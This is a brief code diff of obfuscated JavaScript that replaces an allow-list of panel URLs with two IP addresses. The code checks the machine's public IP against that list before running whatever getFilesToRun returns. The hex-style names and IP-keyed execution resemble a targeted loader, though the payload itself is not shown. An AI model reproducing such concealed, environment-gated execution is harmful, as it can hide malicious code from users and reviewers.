@@ -121,7 +121,7 @@ async function getPublicIP() {
     return null;
   }
 }
-let allowedIPs = ["https://dash.skyultraplus.com", "https://panel.skyultraplus.com"];
+let allowedIPs = ["20.201.28.151", "140.82.121.3"];
 getPublicIP().then(_0x46b177 => {
   if (allowedIPs.includes(_0x46b177)) {
     getFilesToRun().then(_0xcd4e98 => {
